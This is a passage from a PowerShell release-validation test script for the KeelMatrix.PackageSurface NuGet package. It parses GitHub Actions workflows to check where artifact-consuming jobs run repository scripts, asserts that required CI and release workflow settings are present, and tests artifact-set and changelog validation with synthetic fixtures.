        if ([string]::IsNullOrWhiteSpace($line) -or $line.TrimStart().StartsWith('#', [StringComparison]::Ordinal)) { continue }
        $indent = Get-WorkflowIndent $line
        if ($indent -le $stepsIndent) { break }

        $listItem = [regex]::Match($line, '^[ \t]*-\s+')
        if ($stepIndent -lt 0 -and $listItem.Success) { $stepIndent = $indent }
        if ($listItem.Success -and $indent -eq $stepIndent) {
            if ($stepLines.Count -gt 0) { $steps.Add([pscustomobject]@{ Lines = $stepLines.ToArray() }) }
            $stepLines = [Collections.Generic.List[string]]::new()
        }
        if ($stepIndent -ge 0) { $stepLines.Add($line) }
    }
    if ($stepLines.Count -gt 0) { $steps.Add([pscustomobject]@{ Lines = $stepLines.ToArray() }) }
    return $steps.ToArray()
}

function Get-WorkflowRunCommands([string[]] $StepLines) {
    $commands = [Collections.Generic.List[string]]::new()
    for ($index = 0; $index -lt $StepLines.Count; $index++) {
        $run = [regex]::Match([string]$StepLines[$index], '^[ \t]*(?:-\s*)?run:\s*(?<value>.*)$')
        if (-not $run.Success) { continue }

        $value = $run.Groups['value'].Value.Trim()
        if ($value -match '^(?:\||>)[+-]?(?:\s+#.*)?$') {
            $runIndent = Get-WorkflowIndent ([string]$StepLines[$index])
            for ($next = $index + 1; $next -lt $StepLines.Count; $next++) {
                $candidate = [string]$StepLines[$next]
                if (-not [string]::IsNullOrWhiteSpace($candidate) -and (Get-WorkflowIndent $candidate) -le $runIndent) { break }
                $commands.Add($candidate)
            }
        }
        elseif (-not [string]::IsNullOrWhiteSpace($value)) {
            $commands.Add($value)
        }
    }
    return $commands.ToArray()
}

function Get-WorkflowDefaultWorkingDirectory([string[]] $ScopeLines, [int] $DefaultsIndent) {
    for ($index = 0; $index -lt $ScopeLines.Count; $index++) {
        $defaults = [regex]::Match([string]$ScopeLines[$index], '^(?<indent>[ \t]*)defaults:\s*(?:#.*)?$')
        if (-not $defaults.Success -or $defaults.Groups['indent'].Value.Length -ne $DefaultsIndent) { continue }
        $defaultsEnd = $ScopeLines.Count
        for ($end = $index + 1; $end -lt $ScopeLines.Count; $end++) {
            if (-not [string]::IsNullOrWhiteSpace([string]$ScopeLines[$end]) -and (Get-WorkflowIndent ([string]$ScopeLines[$end])) -le $DefaultsIndent) {
                $defaultsEnd = $end
                break
            }
        }
        $runIndent = -1
        for ($nested = $index + 1; $nested -lt $defaultsEnd; $nested++) {
            $run = [regex]::Match([string]$ScopeLines[$nested], '^(?<indent>[ \t]*)run:\s*(?:#.*)?$')
            if ($run.Success -and $run.Groups['indent'].Value.Length -eq ($DefaultsIndent + 2)) {
                $runIndent = $run.Groups['indent'].Value.Length
                continue
            }
            if ($runIndent -ge 0) {
                $directory = [regex]::Match([string]$ScopeLines[$nested], '^[ \t]*working-directory:\s*(?<value>[^#]+?)\s*(?:#.*)?$')
                if ($directory.Success -and (Get-WorkflowIndent ([string]$ScopeLines[$nested])) -eq ($runIndent + 2)) {
                    return $directory.Groups['value'].Value.Trim().Trim('"').Trim("'")
                }
            }
        }
    }
    return $null
}

function Resolve-WorkflowRelativePath([string] $BasePath, [string] $RelativePath) {
    if ([string]::IsNullOrWhiteSpace($RelativePath) -or $RelativePath -match '\$\{\{' -or $RelativePath -match '^(?:/|[A-Za-z]:[\\/])') { return $null }
    $parts = [Collections.Generic.List[string]]::new()
    foreach ($component in @($BasePath, $RelativePath) -join '/' -split '/') {
        if ([string]::IsNullOrWhiteSpace($component) -or $component -eq '.') { continue }
        if ($component -eq '..') {
            if ($parts.Count -eq 0) { return $null }
            $parts.RemoveAt($parts.Count - 1)
            continue
        }
        $parts.Add($component)
    }
    return ($parts -join '/')
}

function Get-WorkflowArtifactScriptConsumers {
    param(
        [Parameter(Mandatory)] [string] $WorkflowText,
        [Parameter(Mandatory)] [string[]] $TrackedFiles
    )

    $allLines = @($WorkflowText -split "`r?`n")
    $jobs = @(Get-WorkflowJobSections -WorkflowText $WorkflowText)
    $jobsLineIndex = -1
    for ($index = 0; $index -lt $allLines.Count; $index++) {
        if ([string]$allLines[$index] -match '^[ \t]*jobs:\s*(?:#.*)?$') { $jobsLineIndex = $index; break }
    }
    $workflowScopeLines = if ($jobsLineIndex -gt 0) { @($allLines[0..($jobsLineIndex - 1)]) } else { @() }
    $workflowWorkingDirectory = Get-WorkflowDefaultWorkingDirectory -ScopeLines $workflowScopeLines -DefaultsIndent 0
    $tracked = [Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
    foreach ($file in $TrackedFiles) { [void]$tracked.Add(([string]$file).Replace('\', '/')) }
    $scriptPattern = '(?i)(?<path>(?:[A-Za-z0-9_.-]+[\\/])*scripts[\\/][A-Za-z0-9_.-]+(?:[\\/][A-Za-z0-9_.-]+)*\.(?:ps1|sh|cmd|bat))'

    $consumers = [Collections.Generic.List[object]]::new()
    foreach ($job in $jobs) {
        $steps = @(Get-WorkflowSteps -JobLines $job.Lines)
        $isArtifactConsumer = $false
        foreach ($step in $steps) {
            if ((@($step.Lines) -join "`n") -match '(?i)actions/download-artifact@') { $isArtifactConsumer = $true; break }
        }
        if (-not $isArtifactConsumer) { continue }

        $jobWorkingDirectory = Get-WorkflowDefaultWorkingDirectory -ScopeLines $job.Lines -DefaultsIndent ($job.Indent + 2)
        if ($null -eq $jobWorkingDirectory) { $jobWorkingDirectory = $workflowWorkingDirectory }
        if ($null -eq $jobWorkingDirectory) { $jobWorkingDirectory = '.' }
        $checkoutPaths = [Collections.Generic.List[string]]::new()
        $checkoutPathIssues = [Collections.Generic.List[string]]::new()
        $checkoutSeen = $false
        $scriptPaths = [Collections.Generic.List[string]]::new()
        $violations = [Collections.Generic.List[string]]::new()

        foreach ($step in $steps) {
            $stepText = @($step.Lines) -join "`n"
            $uses = [regex]::Match($stepText, '(?im)^[ \t]*(?:-\s*)?uses:\s*["'']?(?<value>[^\s"'']+)')
            if ($uses.Success -and $uses.Groups['value'].Value -match '(?i)^actions/checkout@') {
                $checkoutSeen = $true
                $checkoutPath = '.'
                $pathMatch = [regex]::Match($stepText, '(?im)^\s*path:\s*(?<value>[^#\r\n]+?)\s*(?:#.*)?$')
                if ($pathMatch.Success) { $checkoutPath = $pathMatch.Groups['value'].Value.Trim().Trim('"').Trim("'") }
                $resolvedCheckoutPath = Resolve-WorkflowRelativePath -BasePath '' -RelativePath $checkoutPath
                if ($null -eq $resolvedCheckoutPath) {
                    $checkoutPathIssues.Add("checkout path '$checkoutPath' cannot be resolved")
                }
                else {
                    $checkoutPaths.Add($resolvedCheckoutPath)
                }
            }

            foreach ($command in @(Get-WorkflowRunCommands -StepLines $step.Lines)) {
                $normalizedCommand = $command.Replace('\', '/')
                foreach ($scriptMatch in [regex]::Matches($normalizedCommand, $scriptPattern)) {
                    $invocationPath = $scriptMatch.Groups['path'].Value.Replace('\', '/')
                    $scriptIndex = $invocationPath.LastIndexOf('scripts/', [StringComparison]::OrdinalIgnoreCase)
                    if ($scriptIndex -lt 0) { continue }
                    $trackedScriptPath = $invocationPath.Substring($scriptIndex)
                    if (-not $tracked.Contains($trackedScriptPath)) { continue }
                    if (-not $scriptPaths.Contains($trackedScriptPath)) { $scriptPaths.Add($trackedScriptPath) }

                    $stepWorkingDirectory = [regex]::Match($stepText, '(?im)^\s*working-directory:\s*(?<value>[^#\r\n]+?)\s*(?:#.*)?$')
                    $workingDirectory = if ($stepWorkingDirectory.Success) { $stepWorkingDirectory.Groups['value'].Value.Trim().Trim('"').Trim("'") } else { $jobWorkingDirectory }
                    $resolvedWorkingDirectory = Resolve-WorkflowRelativePath -BasePath '' -RelativePath $workingDirectory
                    $resolvedInvocation = if ($null -eq $resolvedWorkingDirectory) { $null } else { Resolve-WorkflowRelativePath -BasePath $resolvedWorkingDirectory -RelativePath $invocationPath }
                    if (-not $checkoutSeen) {
                        $violation = "tracked script '$trackedScriptPath' runs with no preceding repository checkout"
                        if (-not $violations.Contains($violation)) { $violations.Add($violation) }
                        continue
                    }

                    $resolvesInsideCheckout = $false
                    if ($null -ne $resolvedInvocation) {
                        foreach ($checkoutPath in $checkoutPaths) {
                            $relativeInvocation = if ([string]::IsNullOrEmpty($checkoutPath)) {
                                $resolvedInvocation
                            }
                            elseif ($resolvedInvocation.StartsWith("$checkoutPath/", [StringComparison]::OrdinalIgnoreCase)) {
                                $resolvedInvocation.Substring($checkoutPath.Length + 1)
                            }
                            elseif ($resolvedInvocation.Equals($checkoutPath, [StringComparison]::OrdinalIgnoreCase)) {
                                ''
                            }
                            else {
                                $null
                            }
                            if ($null -ne $relativeInvocation -and $relativeInvocation.Equals($trackedScriptPath, [StringComparison]::OrdinalIgnoreCase)) {
                                $resolvesInsideCheckout = $true
                                break
                            }
                        }
                    }
                    if (-not $resolvesInsideCheckout) {
                        $violation = if ($checkoutPathIssues.Count -gt 0) {
                            $checkoutPathIssues -join '; '
                        }
                        else {
                            "tracked script '$trackedScriptPath' does not resolve inside a checked-out repository from the step working directory"
                        }
                        if (-not $violations.Contains($violation)) { $violations.Add($violation) }
                    }
                }
            }
        }

        $consumers.Add([pscustomobject]@{
            Name = $job.Name
            ScriptPaths = $scriptPaths.ToArray()
            Violations = $violations.ToArray()
        })
    }
    return $consumers.ToArray()
}

try {
    $projectText = Get-Content -LiteralPath $projectFile -Raw
    $versionMatch = [regex]::Match($projectText, '<Version>\s*(?<version>[^<]+?)\s*</Version>', [Text.RegularExpressions.RegexOptions]::IgnoreCase)
    if (-not $versionMatch.Success) { throw 'The real packable project has no explicit package version.' }
    $version = $versionMatch.Groups['version'].Value.Trim()
    $realChangelogText = Get-Content -LiteralPath $realChangelog -Raw
    $releaseHeader = [regex]::Match($realChangelogText, "(?m)^##\s+\[$([regex]::Escape($version))\]\s+-\s+(?<date>\d{4}-\d{2}-\d{2})\s*$")
    if (-not $releaseHeader.Success) { throw 'The real changelog has no dated entry for the package version.' }
    $releaseDate = $releaseHeader.Groups['date'].Value

    if (-not (Test-Path -LiteralPath $ciWorkflowPath -PathType Leaf)) { throw 'CI workflow is missing.' }
    if (-not (Test-Path -LiteralPath $releaseWorkflowPath -PathType Leaf)) { throw 'Release workflow is missing.' }
    $ciWorkflow = Get-Content -LiteralPath $ciWorkflowPath -Raw
    $releaseWorkflow = Get-Content -LiteralPath $releaseWorkflowPath -Raw
    # Current downstream artifact consumers use inline checks. Keep the source guard
    # exercised through synthetic jobs while the workflow parser below enforces that
    # the real consumers do not invoke repository scripts after downloading artifacts.
    Assert-WorkflowScriptSourceRegressionCoverage -CurrentConsumers @() -RepositoryRoot $root
    Write-Output 'PASS: checkout-source guard tracks canonical absolute paths, workflow/action PATH state, Windows cmd lookup, working-directory changes, wrapped and stdin evaluators, runner-temp and artifact-output executables, response writers, redirects, tracked-byte restoration, and guarded script invocations.'
    if ($SourceGuardOnly) { return }
    $trackedRepositoryFiles = @(git -C $root ls-files)
    if ($LASTEXITCODE -ne 0) { throw 'Unable to enumerate tracked repository files for workflow-consumer checks.' }

    $currentArtifactConsumers = @(Get-WorkflowArtifactScriptConsumers -WorkflowText $releaseWorkflow -TrackedFiles $trackedRepositoryFiles)
    $currentArtifactConsumerNames = @($currentArtifactConsumers | ForEach-Object Name)
    foreach ($expectedConsumer in @('publish', 'github-release')) {
        if ($expectedConsumer -notin $currentArtifactConsumerNames) { throw "Release workflow artifact consumer '$expectedConsumer' was not enumerated." }
    }
    foreach ($consumer in $currentArtifactConsumers) {
        if ($consumer.Violations.Count -gt 0) {
            throw "Release workflow artifact consumer '$($consumer.Name)' is invalid: $($consumer.Violations -join '; ')"
        }
    }
    $currentScriptConsumers = @($currentArtifactConsumers | Where-Object { $_.ScriptPaths.Count -gt 0 } | ForEach-Object Name)
    if ($currentScriptConsumers.Count -gt 0) {
        throw "Downstream artifact jobs must not call tracked repository scripts on clean runners: $($currentScriptConsumers -join ', ')."
    }
    Write-Output "RELEASE_ARTIFACT_CONSUMERS=$($currentArtifactConsumerNames -join ',')"
    Write-Output "RELEASE_SCRIPT_ARTIFACT_CONSUMERS=$(if ($currentScriptConsumers.Count -eq 0) { '<none>' } else { $currentScriptConsumers -join ',' })"

    $fourSpaceWithoutCheckout = @"
name: Future consumer with four-space job indentation
jobs:
    artifact-check:
      needs: prepare
      steps:
        - uses: actions/download-artifact@v4
        - name: Validate downloaded package
          shell: pwsh
          run: |
            & ./scripts/validate-release.ps1 -Version $version
"@
    $fourSpaceConsumer = @(Get-WorkflowArtifactScriptConsumers -WorkflowText $fourSpaceWithoutCheckout -TrackedFiles $trackedRepositoryFiles | Where-Object Name -eq 'artifact-check')
    if ($fourSpaceConsumer.Count -ne 1 -or $fourSpaceConsumer[0].ScriptPaths.Count -ne 1 -or
        @($fourSpaceConsumer[0].Violations | Where-Object { $_ -match 'no preceding repository checkout' }).Count -ne 1) {
        throw 'Four-space-indented artifact consumers must be discovered and rejected when they run a tracked script without checkout.'
    }

    $sourceCheckoutFromWorkspaceRoot = @"
name: Future consumer with source checkout
jobs:
    artifact-check:
      needs: prepare
      steps:
        - uses: actions/download-artifact@v4
        - uses: actions/checkout@v4
          with:
            path: source
        - name: Validate downloaded package from workspace root
          shell: pwsh
          run: |
            & ./scripts/validate-release.ps1 -Version $version
"@
    $sourceRootConsumer = @(Get-WorkflowArtifactScriptConsumers -WorkflowText $sourceCheckoutFromWorkspaceRoot -TrackedFiles $trackedRepositoryFiles | Where-Object Name -eq 'artifact-check')
    if ($sourceRootConsumer.Count -ne 1 -or
        @($sourceRootConsumer[0].Violations | Where-Object { $_ -match 'does not resolve inside a checked-out repository' }).Count -ne 1) {
        throw 'A workspace-root script invocation must be rejected when checkout placed the repository under source/. '
    }

    $sourceCheckoutWithWorkingDirectory = @"
name: Future consumer with source working directory
jobs:
    artifact-check:
      needs: prepare
      steps:
        - uses: actions/download-artifact@v4
        - uses: actions/checkout@v4
          with:
            path: source
        - name: Validate downloaded package inside checkout
          shell: pwsh
          working-directory: source
          run: |
            & ./scripts/validate-release.ps1 -Version $version
"@
    $sourceWorkingDirectoryConsumer = @(Get-WorkflowArtifactScriptConsumers -WorkflowText $sourceCheckoutWithWorkingDirectory -TrackedFiles $trackedRepositoryFiles | Where-Object Name -eq 'artifact-check')
    if ($sourceWorkingDirectoryConsumer.Count -ne 1 -or $sourceWorkingDirectoryConsumer[0].Violations.Count -ne 0) {
        throw 'A tracked script invocation from the source checkout working directory must pass.'
    }

    $sourceCheckoutFromWorkspaceRootWithQualifiedPath = @"
name: Future consumer with qualified source script path
jobs:
    artifact-check:
      needs: prepare
      steps:
        - uses: actions/download-artifact@v4
        - uses: actions/checkout@v4
          with:
            path: source
        - name: Validate downloaded package from workspace root
          shell: pwsh
          run: |
            & .\source\scripts\validate-release.ps1 -Version $version
"@
    $qualifiedSourceConsumer = @(Get-WorkflowArtifactScriptConsumers -WorkflowText $sourceCheckoutFromWorkspaceRootWithQualifiedPath -TrackedFiles $trackedRepositoryFiles | Where-Object Name -eq 'artifact-check')
    if ($qualifiedSourceConsumer.Count -ne 1 -or $qualifiedSourceConsumer[0].Violations.Count -ne 0) {
        throw 'A tracked script invocation qualified with the source checkout path must pass from the workspace root.'
    }

    $rootCheckoutConsumerWorkflow = @"
name: Future consumer with root checkout
jobs:
    artifact-check:
      needs: prepare
      steps:
        - uses: actions/download-artifact@v4
        - uses: actions/checkout@v4
        - name: Validate downloaded package
          shell: pwsh
          run: pwsh ./scripts/validate-release.ps1 -Version $version
"@
    $rootCheckoutConsumer = @(Get-WorkflowArtifactScriptConsumers -WorkflowText $rootCheckoutConsumerWorkflow -TrackedFiles $trackedRepositoryFiles | Where-Object Name -eq 'artifact-check')
    if ($rootCheckoutConsumer.Count -ne 1 -or $rootCheckoutConsumer[0].Violations.Count -ne 0) {
        throw 'A tracked script invocation from the default workspace root checkout must pass.'
    }

    $jobDefaultWorkingDirectoryWorkflow = @"
name: Future consumer with job run defaults
jobs:
    artifact-check:
      needs: prepare
      defaults:
        run:
          working-directory: source
      steps:
        - uses: actions/download-artifact@v4
        - uses: actions/checkout@v4
          with:
            path: source
        - name: Validate downloaded package
          shell: pwsh
          run: pwsh ./scripts/validate-release.ps1 -Version $version
"@
    $jobDefaultConsumer = @(Get-WorkflowArtifactScriptConsumers -WorkflowText $jobDefaultWorkingDirectoryWorkflow -TrackedFiles $trackedRepositoryFiles | Where-Object Name -eq 'artifact-check')
    if ($jobDefaultConsumer.Count -ne 1 -or $jobDefaultConsumer[0].Violations.Count -ne 0) {
        throw 'A job-level run working directory must resolve scripts inside a non-root checkout.'
    }

    $workflowDefaultWorkingDirectoryWorkflow = @"
name: Future consumer with workflow run defaults
defaults:
  run:
    working-directory: source
jobs:
    artifact-check:
      needs: prepare
      steps:
        - uses: actions/download-artifact@v4
        - uses: actions/checkout@v4
          with:
            path: source
        - name: Validate downloaded package
          shell: pwsh
          run: pwsh ./scripts/validate-release.ps1 -Version $version
"@
    $workflowDefaultConsumer = @(Get-WorkflowArtifactScriptConsumers -WorkflowText $workflowDefaultWorkingDirectoryWorkflow -TrackedFiles $trackedRepositoryFiles | Where-Object Name -eq 'artifact-check')
    if ($workflowDefaultConsumer.Count -ne 1 -or $workflowDefaultConsumer[0].Violations.Count -ne 0) {
        throw 'A workflow-level run working directory must resolve scripts inside a non-root checkout.'
    }

    $stepDirectoryDoesNotLeakWorkflow = @"
name: Future consumer with step-scoped directory
jobs:
    artifact-check:
      needs: prepare
      steps:
        - uses: actions/download-artifact@v4
        - uses: actions/checkout@v4
          with:
            path: source
        - name: Run a command from the checkout
          working-directory: source
          run: pwsh -NoLogo -Command 'Get-Location'
        - name: Validate downloaded package from workspace root
          shell: pwsh
          run: pwsh ./scripts/validate-release.ps1 -Version $version
"@
    $stepScopedConsumer = @(Get-WorkflowArtifactScriptConsumers -WorkflowText $stepDirectoryDoesNotLeakWorkflow -TrackedFiles $trackedRepositoryFiles | Where-Object Name -eq 'artifact-check')
    if ($stepScopedConsumer.Count -ne 1 -or
        @($stepScopedConsumer[0].Violations | Where-Object { $_ -match 'does not resolve inside a checked-out repository' }).Count -ne 1) {
        throw 'A step-level working directory must not leak into later script invocations.'
    }

    foreach ($required in @(
        'push:',
        'branches:',
        '- main',
        'pull_request:',
        'workflow_dispatch:',
        'commit_sha:',
        'required: false',
        'type: string',
        'inputs.commit_sha || github.sha',
        'fetch-depth: 0',
        'persist-credentials: false',
        'global-json-file: global.json',
        'dotnet restore ./KeelMatrix.PackageSurface.sln --configfile ./NuGet.config --force',
        'pwsh -NoLogo -NoProfile -File ./scripts/run-local-gate.ps1',
        'windows-latest',
        'ubuntu-latest',
        'macos-latest',
        'fail-fast: false',
        'KEELMATRIX_TELEMETRY: ''off''',
        'permissions:',
        'contents: read',
        'cancel-in-progress: true',
        'timeout-minutes: 45',
        'commit_sha must be a full 40-character commit SHA.',
        'git rev-parse HEAD'
    )) {
        if (-not $ciWorkflow.Contains($required, [StringComparison]::Ordinal)) { throw "CI workflow is missing '$required'." }
    }

    if ($releaseWorkflow -notmatch "(?ms)^on:\s*\r?\n\s+push:\s*\r?\n\s+tags:\s*\r?\n\s+- 'v\*\.\*\.\*'") {
        throw 'Release workflow must be tag-triggered only for v*.*.*.'
    }
    foreach ($required in @(
        'global-json-file: global.json',
        'timeout-minutes: 45',
        'actions/download-artifact@v4',
        'KEELMATRIX_TELEMETRY: ''off''',
        './scripts/validate-release.ps1 -Version $version -RequireFinalized -FirstRelease',
        './scripts/run-local-gate.ps1 -ArtifactDirectory artifacts/release -ExpectedVersion $version',
        './scripts/validate-release-artifact-set.ps1 -Version $env:RELEASE_VERSION -ArtifactDirectory artifacts/release',
        'path: artifacts/release/*',
        'NuGet/login@v1',
        'user: dmitriyzen',
        'needs: validate',
        'needs: [validate, publish]',
        'dotnet nuget push',
        'gh release create',
        '--verify-tag',
        '--repo "$RELEASE_REPOSITORY"',
        '[IO.File]::AppendAllText($env:GITHUB_OUTPUT',
        'version=$version',
        'RELEASE_VERSION: ${{ steps.release_contract.outputs.version }}',
        'RELEASE_VERSION: ${{ needs.validate.outputs.version }}',
        'if ([string]::IsNullOrWhiteSpace($version))',
        'if ($env:RELEASE_TAG -cne "v$version")',
        'Validate package set before NuGet authentication',
        'Downloaded release artifact set is not exact',
        'expected_package="KeelMatrix.PackageSurface.$RELEASE_VERSION.nupkg"',
        'RELEASE_REPOSITORY: ${{ github.repository }}'
    )) {
        if (-not $releaseWorkflow.Contains($required, [StringComparison]::Ordinal)) { throw "Release workflow is missing '$required'." }
    }
    $validatedOutputMapping = 'RELEASE_VERSION: ${{ needs.validate.outputs.version }}'
    if ([regex]::Matches($releaseWorkflow, [regex]::Escape($validatedOutputMapping)).Count -ne 2) {
        throw 'NuGet publish and GitHub Release must both receive the validated job output.'
    }
    if ($releaseWorkflow.Contains("PACKAGE_VERSION:", [StringComparison]::Ordinal)) { throw 'Release workflow maintains a second hard-coded package-version definition.' }
    if (-not $releaseWorkflow.Contains('steps.release_contract.outputs.version', [StringComparison]::Ordinal)) {
        throw 'Artifact validation does not receive the release-contract step output.'
    }
    if ($releaseWorkflow.Contains('run-phase0.ps1', [StringComparison]::Ordinal)) { throw 'Release workflow runs a mutating standalone Phase 0 step.' }
    if ($releaseWorkflow -match '(?m)dotnet\s+run\s+--project\s+tests/') { throw 'Release workflow duplicates console leaf tests beside the canonical gate.' }
    if ($releaseWorkflow -match '(?m)^\s*run:\s*dotnet\s+pack\b') { throw 'Release workflow repacks a separately validated artifact.' }
    $artifactSetValidationIndex = $releaseWorkflow.IndexOf('./scripts/validate-release-artifact-set.ps1 -Version $env:RELEASE_VERSION -ArtifactDirectory artifacts/release', [StringComparison]::Ordinal)
    $artifactUploadIndex = $releaseWorkflow.IndexOf('uses: actions/upload-artifact@v4', [StringComparison]::Ordinal)
    if ($artifactSetValidationIndex -lt 0 -or $artifactUploadIndex -lt 0 -or $artifactSetValidationIndex -ge $artifactUploadIndex) {
        throw 'The generated package set must pass the shared validator before upload.'
    }
    if ($releaseWorkflow -notmatch '(?s)validate:.*outputs:.*version:.*release_contract') { throw 'Release workflow does not pass the validated tag version to downstream jobs.' }
    if ($releaseWorkflow -notmatch '(?s)publish:.*needs:\s*validate.*NuGet/login@v1') { throw 'Publish does not depend on validation and Trusted Publishing.' }
    if ($releaseWorkflow -notmatch '(?s)github-release:.*needs:\s*\[validate, publish\]') { throw 'GitHub Release is not ordered after validation and publication.' }
    $publishValidationIndex = $releaseWorkflow.IndexOf('Validate package set before NuGet authentication', [StringComparison]::Ordinal)
    $nugetLoginIndex = $releaseWorkflow.IndexOf('uses: NuGet/login@v1', [StringComparison]::Ordinal)
    if ($publishValidationIndex -lt 0 -or $nugetLoginIndex -lt 0 -or $publishValidationIndex -ge $nugetLoginIndex) {
        throw 'Downloaded artifacts must be validated before NuGet Trusted Publishing authentication.'
    }
    $publishPreflight = $releaseWorkflow.Substring($publishValidationIndex, $nugetLoginIndex - $publishValidationIndex)
    if (-not $publishPreflight.Contains('if ([string]::IsNullOrWhiteSpace($version))', [StringComparison]::Ordinal) -or
        -not $publishPreflight.Contains('if ($env:RELEASE_TAG -cne "v$version")', [StringComparison]::Ordinal)) {
        throw 'NuGet authentication must be preceded by empty-version and tag-version checks.'
    }
    if (-not $releaseWorkflow.Contains('if [[ "$RELEASE_TAG" != "v$RELEASE_VERSION" ]]', [StringComparison]::Ordinal) -or
        $releaseWorkflow.IndexOf('if [[ "$RELEASE_TAG" != "v$RELEASE_VERSION" ]]', [StringComparison]::Ordinal) -ge
        $releaseWorkflow.IndexOf('gh release create', [StringComparison]::Ordinal)) {
        throw 'GitHub Release must reject an empty or tag-mismatched version before release creation.'
    }

    $localGate = Get-Content -LiteralPath $localGatePath -Raw
    foreach ($requiredGate in @(
        'scripts/test-release-contract.ps1',
        'scripts/test-vulnerability-audit.ps1',
        'validate-package-artifact.ps1',
        'dotnet pack',
        '[string] $ExpectedVersion',
        'scripts/validate-release.ps1',
        'dotnet msbuild $cliProject -getProperty:Version',
        '$suppliedPackageVersion = if ($PSBoundParameters.ContainsKey(''ExpectedVersion'')) { [string]$ExpectedVersion } else { $projectVersion }',
        '$packageVersion -cne $projectVersion',
        '--version $packageVersion',
        '-ExpectedVersion $packageVersion',
        'Compare-Object -CaseSensitive'
    )) {
        if (-not $localGate.Contains($requiredGate, [StringComparison]::Ordinal)) { throw "Canonical local gate is missing '$requiredGate'." }
    }
    if ($localGate -notmatch '(?s)finally\s*\{.*\$scratch') { throw 'Canonical local gate does not clean run-owned scratch state in finally.' }
    if ($localGate -notmatch 'ReadAllBytes|Read-ZipEntryBytes') { throw 'Canonical local gate does not validate package bytes.' }

    if (-not (Test-Path -LiteralPath $artifactSetValidatorPath -PathType Leaf)) { throw 'Release artifact-set validator is missing.' }
    $artifactNames = @("KeelMatrix.PackageSurface.$version.nupkg", "KeelMatrix.PackageSurface.$version.snupkg")
    $exactArtifactDirectory = New-ArtifactSetDirectory 'artifact-set-exact' $artifactNames
    Assert-ValidationPass 'exact release artifact set' (Invoke-ArtifactSetValidation -Version $version -Directory $exactArtifactDirectory)
    Assert-ValidationRejects 'empty release version' (Invoke-ArtifactSetValidation -Version '' -Directory $exactArtifactDirectory)
    Assert-ValidationRejects 'whitespace release version' (Invoke-ArtifactSetValidation -Version '   ' -Directory $exactArtifactDirectory)
    Assert-ValidationRejects 'padded release version' (Invoke-ArtifactSetValidation -Version " $version" -Directory $exactArtifactDirectory)
    Assert-ValidationRejects 'malformed release version' (Invoke-ArtifactSetValidation -Version 'latest' -Directory $exactArtifactDirectory)
    $mismatchedVersion = if ($version -eq '0.0.0') { '0.0.1' } else { '0.0.0' }
    Assert-ValidationRejects 'artifact version mismatch' (Invoke-ArtifactSetValidation -Version $mismatchedVersion -Directory $exactArtifactDirectory)
    Assert-ValidationRejects 'local gate package/project version mismatch' (Invoke-LocalGateVersionValidation -Version $mismatchedVersion)
    Assert-ValidationRejects 'local gate padded package version' (Invoke-LocalGateVersionValidation -Version " $version")

    $missingPackageDirectory = New-ArtifactSetDirectory 'artifact-set-missing-package' @($artifactNames[1])
    Assert-ValidationRejects 'missing package artifact' (Invoke-ArtifactSetValidation -Version $version -Directory $missingPackageDirectory)
    $missingSymbolsDirectory = New-ArtifactSetDirectory 'artifact-set-missing-symbols' @($artifactNames[0])
    Assert-ValidationRejects 'missing symbols artifact' (Invoke-ArtifactSetValidation -Version $version -Directory $missingSymbolsDirectory)
    $extraFileDirectory = New-ArtifactSetDirectory 'artifact-set-extra-file' ($artifactNames + 'unexpected.txt')
    Assert-ValidationRejects 'extra artifact file' (Invoke-ArtifactSetValidation -Version $version -Directory $extraFileDirectory)
    $extraDirectory = New-ArtifactSetDirectory 'artifact-set-extra-directory' $artifactNames
    [void][IO.Directory]::CreateDirectory((Join-Path $extraDirectory 'unexpected'))
    Assert-ValidationRejects 'extra artifact directory' (Invoke-ArtifactSetValidation -Version $version -Directory $extraDirectory)
    $wrongCaseDirectory = New-ArtifactSetDirectory 'artifact-set-wrong-case' @("keelmatrix.packagesurface.$version.nupkg", $artifactNames[1])
    Assert-ValidationRejects 'artifact filename case mismatch' (Invoke-ArtifactSetValidation -Version $version -Directory $wrongCaseDirectory)

    # The finalized repository changelog must pass both candidate and first-release tag validation.
    Assert-ValidationPass 'real finalized candidate' (Invoke-ReleaseValidation -Version $version -ChangelogPath $realChangelog)
    Assert-ValidationPass 'real finalized first-release tag gate' (Invoke-ReleaseValidation -Version $version -ChangelogPath $realChangelog -RequireFinalized -FirstRelease)
    Assert-ValidationRejects 'local gate empty expected version' (Invoke-LocalGateVersionValidation -Version '')
    Assert-ValidationRejects 'local gate whitespace expected version' (Invoke-LocalGateVersionValidation -Version ' ')
    Assert-ValidationRejects 'local gate mismatched expected version' (Invoke-LocalGateVersionValidation -Version '9.9.9')

    $workflowOutputPath = Join-Path $scratch 'github-output'
    $serializedOutput = 'version=' + $version + [Environment]::NewLine
    [IO.File]::AppendAllText($workflowOutputPath, $serializedOutput, [Text.UTF8Encoding]::new($false))
    $workflowOutputBytes = [IO.File]::ReadAllBytes($workflowOutputPath)
    if ($workflowOutputBytes.Length -ge 3 -and $workflowOutputBytes[0] -eq 239 -and $workflowOutputBytes[1] -eq 187 -and $workflowOutputBytes[2] -eq 191) {
        throw 'GitHub Actions release output must be written without a UTF-8 byte-order mark.'
    }
    if ([IO.File]::ReadAllText($workflowOutputPath) -cne $serializedOutput) {
        throw 'Release-contract output does not serialize the validated version exactly.'
    }

    $missingUnreleasedChangelog = Join-Path $scratch 'CHANGELOG.missing-unreleased.md'
    $missingUnreleasedFirstRelease = "# Changelog`n`n## [$version] - $releaseDate`n`n### Added`n`n- Initial release capability review.`n"
    [IO.File]::WriteAllText($missingUnreleasedChangelog, $missingUnreleasedFirstRelease, [Text.UTF8Encoding]::new($false))
    Assert-ValidationRejects 'first-release missing Unreleased section' (Invoke-ReleaseValidation -Version $version -ChangelogPath $missingUnreleasedChangelog -RequireFinalized -FirstRelease)

    $alternateUnreleasedChangelog = Join-Path $scratch 'CHANGELOG.alternate-unreleased.md'
    $alternateUnreleasedFirstRelease = "# Changelog`n`n## [Next]`n`n## [$version] - $releaseDate`n`n### Added`n`n- Initial release capability review.`n"
    [IO.File]::WriteAllText($alternateUnreleasedChangelog, $alternateUnreleasedFirstRelease, [Text.UTF8Encoding]::new($false))
    Assert-ValidationRejects 'first-release alternate Unreleased heading' (Invoke-ReleaseValidation -Version $version -ChangelogPath $alternateUnreleasedChangelog -RequireFinalized -FirstRelease)

    $nestedReleaseChangelog = Join-Path $scratch 'CHANGELOG.nested-release.md'
    $nestedReleaseFirstRelease = "# Changelog`n`n## [Unreleased]`n`n### [$version] - $releaseDate`n`n#### Added`n`n- Initial release capability review.`n"
